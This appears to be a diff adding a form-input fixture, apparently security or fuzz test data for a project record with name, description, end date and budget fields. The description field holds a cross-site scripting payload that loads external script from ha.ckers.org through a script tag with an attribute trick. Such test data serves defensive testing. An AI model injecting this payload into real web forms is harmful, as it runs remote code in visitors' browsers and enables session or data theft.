@@ -1,0 +1,6 @@
+name : Jn.Y'N NX   .' 59H4 
+desc : <SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+end : 28.6.2016
+budget : 854264
+assignto[] : 1
+assignme : 1
